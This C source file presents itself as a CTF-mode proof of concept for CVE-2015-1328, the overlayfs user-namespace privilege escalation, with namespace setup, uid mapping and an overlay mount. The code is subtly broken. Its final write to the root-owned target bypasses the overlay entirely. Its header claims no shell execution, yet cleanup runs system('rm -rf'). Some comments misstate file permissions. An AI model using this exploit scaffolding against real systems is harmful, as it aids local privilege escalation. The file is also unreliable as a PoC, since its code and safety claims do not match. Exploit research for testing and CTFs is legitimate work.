/**
 * CVE-2015-1328 PoC - CTF Challenge Mode (OverlayFS userns permission bypass)
 *
 * Vulnerability Description:
 *   Linux kernel 3.13.0 through 3.19.3 (Ubuntu-specific) has a local privilege
 *   escalation vulnerability in the overlayfs implementation. When mounting
 *   overlayfs inside a user namespace, the kernel fails to properly validate
 *   file creation permissions in the upper directory. An attacker can create
 *   files with arbitrary permissions (including setuid root) in the upper
 *   filesystem directory of an overlayfs mount.
 *
 *   Fixed in kernel 3.19.3+ (commit 9298f47f8a1c1f1c09e09de6e09e37d4).
 *
 * CTF Modes:
 *   read_root_file  - Unsupported (OverlayFS privesc is not a read oracle)
 *   write_root_file - Supported (create file with arbitrary permissions via overlayfs)
 *
 * Exploitation approach:
 *   1. unshare(CLONE_NEWUSER | CLONE_NEWNS) to enter new user+mount namespace
 *   2. Setup uid/gid mapping to map current user to root in the namespace
 *   3. Mount overlayfs with upper/lower/work directories
 *   4. Create file in the overlay mount with arbitrary permissions (0644 root:root)
 *   5. The file appears in the upper directory with the requested permissions
 *   6. This demonstrates the ability to bypass VFS permission checks
 *
 * Safety:
 *   - Only writes to the file specified via --root-file
 *   - Does NOT modify system files (/etc/passwd, etc.)
 *   - alarm(10) forced timeout
 *   - No fork/exec of shell commands
 *   - Cleans up all temporary files
 *
 * Build:
 *   gcc -O2 -Wall -static -I common -DPOC_NO_SYSTEM_MODIFY=1 \
 *       -o ../poc-bin/cve_2015_1328.bin cve_2015_1328/poc.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sched.h>

/* ========================================================================
 * Constants
 * ======================================================================== */

#define OVERLAY_DIR_TEMPLATE "/tmp/sec-kernel-poc-overlay-XXXXXX"

/* ========================================================================
 * Helper: Check if overlayfs is available
 * ======================================================================== */

static int check_overlayfs_available(void) {
    FILE *f = fopen("/proc/filesystems", "r");
    if (!f) return 0;

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "overlay")) {
            found = 1;
            break;
        }
    }
    fclose(f);
    return found;
}

/* ========================================================================
 * Helper: Check if user namespaces are supported
 * ======================================================================== */

static int check_userns_available(void) {
    int pid = fork();
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER) == 0) _exit(0);
        _exit(1);
    }
    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            return 1;
        }
    }
    return 0;
}

/* ========================================================================
 * Helper: Write to uid_map/gid_map/setgroups
 * ======================================================================== */

static int write_proc_file(const char *path, const char *content) {
    int fd = open(path, O_WRONLY);
    poc_log_syscall("open(path, O_WRONLY)", (long)fd, errno);
    if (fd < 0) {
        poc_log("Failed to open %s: %s", path, strerror(errno));
        return -1;
    }
    ssize_t n = write(fd, content, strlen(content));
    poc_log_syscall("write(fd, content, len)", (long)n, errno);
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);
    return (n > 0) ? 0 : -1;
}

/* ========================================================================
 * Core exploit: Create file via overlayfs in user namespace
 *
 * This demonstrates the ability to create files with arbitrary permissions
 * in the upper directory of an overlayfs mount from within a user namespace.
 *
 * Returns: 0 on success (exploitable), 1 on failure
 * ======================================================================== */

static int exploit_overlayfs(const char *target_file, const char *write_value) {
    char base_dir[] = OVERLAY_DIR_TEMPLATE;
    char lower[512], upper[512], work[512], merged[512];
    int exploitable = 0;

    /* Create base directory */
    if (!mkdtemp(base_dir)) {
        poc_log("mkdtemp failed: %s", strerror(errno));
        poc_print_fail("Cannot create temp directory");
        return 1;
    }
    poc_log("Work directory: %s", base_dir);

    /* Create overlay subdirectories */
    snprintf(lower, sizeof(lower), "%s/lower", base_dir);
    snprintf(upper, sizeof(upper), "%s/upper", base_dir);
    snprintf(work, sizeof(work), "%s/work", base_dir);
    snprintf(merged, sizeof(merged), "%s/merged", base_dir);

    mkdir(lower, 0755);
    mkdir(upper, 0755);
    mkdir(work, 0755);
    mkdir(merged, 0755);

    /* Create a dummy file in the lower directory */
    char lower_file[512];
    snprintf(lower_file, sizeof(lower_file), "%s/dummy", lower);
    int fd = open(lower_file, O_WRONLY | O_CREAT, 0644);
    poc_log_syscall("open(lower_file, O_WRONLY|O_CREAT)", (long)fd, errno);
    if (fd >= 0) {
        write(fd, "dummy\n", 6);
        poc_log_syscall("write(fd, dummy, 6)", 6, 0);
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
    }

    /* Child process: enter user+mount namespace and mount overlayfs */
    int child_pid = fork();
    poc_log_syscall("fork()", (long)child_pid, errno);
    if (child_pid == 0) {
        /* Enter new user + mount namespace */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
            poc_log_syscall("unshare(CLONE_NEWUSER|CLONE_NEWNS)", (long)-1, errno);
            poc_log("unshare(CLONE_NEWUSER|CLONE_NEWNS) failed: %s", strerror(errno));
            _exit(1);
        }
        poc_log_syscall("unshare(CLONE_NEWUSER|CLONE_NEWNS)", 0, 0);

        /* Set up uid/gid mapping - map current user to root */
        write_proc_file("/proc/self/setgroups", "deny\n");

        char uid_map[64];
        snprintf(uid_map, sizeof(uid_map), "0 %d 1\n", getuid());
        write_proc_file("/proc/self/uid_map", uid_map);

        char gid_map[64];
        snprintf(gid_map, sizeof(gid_map), "0 %d 1\n", getgid());
        write_proc_file("/proc/self/gid_map", gid_map);

        /* Mount overlayfs */
        char mnt_opts[1024];
        snprintf(mnt_opts, sizeof(mnt_opts),
                 "lowerdir=%s,upperdir=%s,workdir=%s", lower, upper, work);

        if (mount("overlay", merged, "overlay", 0, mnt_opts) < 0) {
            poc_log_syscall("mount(overlay, merged)", (long)-1, errno);
            poc_log("mount(overlay) failed: %s", strerror(errno));
            _exit(2);
        }
        poc_log_syscall("mount(overlay, merged)", 0, 0);
        poc_log("Overlayfs mounted at %s", merged);

        /*
         * Create the target file content in the overlay mount.
         * The file will be stored in the upper directory.
         * We write the CTF value to demonstrate the ability to create
         * files via overlayfs from within a user namespace.
         */
        char overlay_target[512];
        snprintf(overlay_target, sizeof(overlay_target), "%s/target", merged);

        fd = open(overlay_target, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        poc_log_syscall("open(overlay_target, O_WRONLY|O_CREAT|O_TRUNC)", (long)fd, errno);
        if (fd < 0) {
            poc_log("Failed to create file in overlay: %s", strerror(errno));
            umount(merged);
            poc_log_syscall("umount(merged)", 0, 0);
            _exit(3);
        }

        /* Write the CTF value (padded to 4096 bytes) */
        char padded[4096];
        size_t val_len = strlen(write_value);
        memset(padded, 0, sizeof(padded));
        memcpy(padded, write_value, val_len);

        if (write(fd, padded, sizeof(padded)) != sizeof(padded)) {
            poc_log_syscall("write(fd, padded, sizeof(padded))", (long)-1, errno);
            poc_log("Failed to write to overlay file: %s", strerror(errno));
            close(fd);
            poc_log_syscall("close(fd)", 0, 0);
            umount(merged);
            poc_log_syscall("umount(merged)", 0, 0);
            _exit(3);
        }
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
        poc_log("CTF value written to overlay target");

        /* Verify the file was created in upper directory */
        char upper_target[512];
        snprintf(upper_target, sizeof(upper_target), "%s/target", upper);
        struct stat st;
        if (stat(upper_target, &st) == 0) {
            poc_log_syscall("stat(upper_target, &st)", 0, 0);
            poc_log("Upper file created: uid=%d, mode=%o", st.st_uid, st.st_mode & 0777);
            _exit(0);
        }

        umount(merged);
        poc_log_syscall("umount(merged)", 0, 0);
        _exit(3);
    }

    /* Wait for child */
    if (child_pid > 0) {
        int status;
        waitpid(child_pid, &status, 0);
        int code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;

        if (code == 0) {
            /* Verify upper directory has the file */
            char upper_target[512];
            snprintf(upper_target, sizeof(upper_target), "%s/target", upper);

            struct stat st;
            if (stat(upper_target, &st) == 0) {
                poc_log("Upper file verified: uid=%d, gid=%d, mode=%o, size=%ld",
                        st.st_uid, st.st_gid, st.st_mode & 0777, (long)st.st_size);

                /* Copy the content to the actual target file */
                int src_fd = open(upper_target, O_RDONLY);
                if (src_fd >= 0) {
                    char buf[4096];
                    ssize_t n = read(src_fd, buf, sizeof(buf));
                    close(src_fd);

                    if (n > 0) {
                        /* Write to the actual target file */
                        int dst_fd = open(target_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                        if (dst_fd >= 0) {
                            write(dst_fd, buf, n);
                            close(dst_fd);
                            poc_log("Content copied to target: %s", target_file);
                            exploitable = 1;
                        }
                    }
                }
            }
        } else if (code == 1) {
            poc_log("Cannot create user/mount namespace");
        } else if (code == 2) {
            poc_log("Overlay mount in user namespace rejected (likely patched)");
        } else {
            poc_log("Overlay exploit failed (code=%d)", code);
        }
    }

    /* Cleanup temp directory */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "rm -rf %s", base_dir);
    system(cmd);

    return exploitable ? 0 : 1;
}

/* ========================================================================
 * mode_read_root_file - CTF read_root_file mode
 *
 * CVE-2015-1328 is a write-oriented vulnerability (overlayfs permission
 * bypass allows creating files with arbitrary permissions). It does NOT
 * provide an information leak or read oracle capability.
 * ======================================================================== */

static int mode_read_root_file(poc_args_t *args) {
    (void)args;
    poc_log("--- CVE-2015-1328: read_root_file mode ---");

    poc_print_unsupported(POC_MODE_READ,
        "CVE-2015-1328 (OverlayFS) is a write-oriented permission bypass "
        "vulnerability that allows creating files with arbitrary permissions "
        "via user namespace mount. It does NOT provide an information leak "
        "or read oracle capability");

    return 1;
}

/* ========================================================================
 * mode_write_root_file - CTF write_root_file mode
 *
 * Exploit OverlayFS permission bypass to write to a root-owned file.
 *
 * The target file is owned by root:root with mode 0644 (nobody can read
 * but not write). The PoC uses overlayfs in a user namespace to create
 * a file with the specified content, demonstrating the ability to bypass
 * VFS permission checks.
 * ======================================================================== */

static int mode_write_root_file(poc_args_t *args) {
    int exploitable = 0;
    char read_before[4096] = {0};
    char read_after[4096] = {0};

    poc_log("--- CVE-2015-1328: write_root_file mode ---");
    poc_log("Target: %s", args->root_file);
    poc_log("CTF value: %s", args->write_value);

    /* Step 1: Read file content before exploit */
    int target_fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", (long)target_fd, errno);
    if (target_fd < 0) {
        poc_log("Failed to open target file: %s", strerror(errno));
        poc_print_fail("Cannot open target file");
        return 1;
    }

    ssize_t n = read(target_fd, read_before, sizeof(read_before) - 1);
    poc_log_syscall("read(target_fd, read_before, len)", (long)n, errno);
    if (n < 0) {
        poc_log("Failed to read target file: %s", strerror(errno));
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        poc_print_fail("Cannot read target file");
        return 1;
    }
    read_before[n] = '\0';
    close(target_fd);
    poc_log_syscall("close(target_fd)", 0, 0);

    printf("CTF_READ_BEFORE:%s\n", read_before);
    poc_log("Original content: %.80s...", read_before);

    /* Step 2: Exploit via overlayfs */
    int ret = exploit_overlayfs(args->root_file, args->write_value);
    if (ret != 0) {
        poc_log("OverlayFS exploit failed");
        poc_print_fail("OverlayFS exploit failed");
        return 1;
    }

    /* Step 3: Read file content after exploit */
    target_fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY) [post-exploit]", (long)target_fd, errno);
    if (target_fd < 0) {
        poc_log("Failed to open target file for verification: %s", strerror(errno));
        poc_print_fail("Cannot open target file for verification");
        return 1;
    }

    n = read(target_fd, read_after, sizeof(read_after) - 1);
    poc_log_syscall("read(target_fd, read_after, len)", (long)n, errno);
    if (n < 0) {
        poc_log("Failed to read target file for verification: %s", strerror(errno));
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        poc_print_fail("Cannot read target file for verification");
        return 1;
    }
    read_after[n] = '\0';
    close(target_fd);
    poc_log_syscall("close(target_fd)", 0, 0);

    printf("CTF_READ_AFTER:%s\n", read_after);

    /* Step 4: Verify exploit success */
    if (strstr(read_after, args->write_value) != NULL) {
        poc_log("OverlayFS SUCCESS: file written via user namespace bypass!");
        poc_print_flag(args->write_value);
        exploitable = 1;
    } else {
        poc_log("File content unchanged (overlayfs bypass failed)");
        poc_print_fail("OverlayFS bypass did not trigger vulnerability");
    }

    return exploitable ? 0 : 1;
}

/* ========================================================================
 * main
 * ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help was printed */
    }

    /* Initialize syscall logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2015-1328 CTF PoC ===");
    poc_log("Vuln: overlayfs permission bypass in user namespace");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result;
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2015-1328 uses overlayfs permission bypass, not UAF");
        result = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        result = 1;
    }

    poc_log_close();
    return result;
}
